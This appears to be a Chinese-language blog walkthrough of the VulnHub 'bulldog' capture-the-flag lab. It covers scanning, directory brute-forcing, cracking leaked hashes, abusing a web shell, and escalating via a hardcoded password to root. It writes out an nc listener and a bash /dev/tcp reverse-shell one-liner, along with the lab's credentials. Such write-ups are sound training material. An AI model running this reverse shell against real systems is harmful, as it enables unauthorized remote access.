# vulnhub之bulldog的实践

最近开始重新回归实践vulnhub的CTF系列，本周是bulldog镜像，

下载地址，https://download.vulnhub.com/bulldog/bulldog.ova，

在WorkStation下导入，启动后做地址扫描，扫不到，

![](../Images/13be6d89958c4b464cfbbaad9440639e.png)

以我的经验是导出环境跟WorkStation的网卡不兼容导致，在网上搜了一下别人的CTF writeup，知道了最后拿到的账户密码是django/SUPERultimatePASSWORDyouCANTget，就直接登录进去看看，原来WorkStation下网卡名字叫ens33，

![](../Images/66a8c42981b5039d3c688b48865ba525.png)

而镜像原来的网卡名叫enp0s3，

![](../Images/5de25818d3489656900274998255b657.png)

把网卡名字改对了再重启就可以了，再次做地址扫描就有了，

![](../Images/e0a2f8aec682fc1692aaaa8118f4b405.png)

接着对这个地址做服务扫描，扫描出了80和8080端口的web服务，23端口的ssh服务，

![](../Images/c4fac9a32c348df8d1b298072cf0698d.png)

对web服务做个目录爆破，能看到admin和dev两个有用的url，80和8080都一样，这里就只展示80的，

![](../Images/b744511f48855892cc1c96afb6add362.png)

dev这里有个彩蛋，看源码能看到几个账户和密码的hash，

![](../Images/16f6612cbb963c2eeea2e0bd5c4a98eb.png)

经过https://www.somd5.com/破解，有两组成功，nick/bulldog，sarah/bulldoglover，随便用一组在admin的url上登录一下，虽然进去以后没啥用，但是dev的url里的Web-Shell就能访问了，

![](../Images/cfba82059f0b62a013b9a3eb5796da04.png)

接下来有些技术含量，看Web-Shell里只能执行这些命令，可以通过echo搞一个系统反弹shell出来，

先在外面用nc开一个监听，nc -lvp 1234，

然后在Web-Shell输入框中输入echo 'bash -i >& /dev/tcp/192.168.137.2/1234 0>&1' | bash并运行，

就能在外面看到系统反弹shell过来了，

![](../Images/c9ac82979501c6c51cef4c72c4c9e77d.png)

这个系统反弹shell质量很差，无法执行sudo命令，

到这里我自己就没啥思路了，于是又看了网上的writeup，知道这里还有个彩蛋，在外两层目录里有一个隐藏目录，里面有个文件，

![](../Images/90149419ae69731784008f9988cb49b1.png)

可以通过strings customPermissionApp看这个文件的内容，

![](../Images/97b4d226fb380a48fcc5d84afe730041.png)

能看到当前账户django密码就是SUPERultimatePASSWORDyouCANTget，这也太不符合常理了，真实情况哪会有这种巧合，于是就可以在外面正式登录bulldog系统了，注意ssh端口是23，之前扫描出来过，ssh -p 23 django@192.168.137.20，

进去后再用sudo命令就能切换到root了，至此CTF完成，

![](../Images/1022ae02a132dc7d5194dd6653985462.png)
